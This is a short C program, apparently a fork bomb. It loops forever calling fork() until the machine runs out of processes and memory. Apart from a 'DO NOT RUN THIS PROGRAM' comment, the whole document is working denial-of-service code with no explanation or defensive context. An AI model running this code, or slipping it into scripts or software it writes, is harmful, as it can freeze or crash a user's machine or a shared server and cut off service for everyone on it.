#include <unistd.h>
// DO NOT RUN THIS PROGRAM
int main() {
    while (1) {
        fork();
    }
    return 0;
}

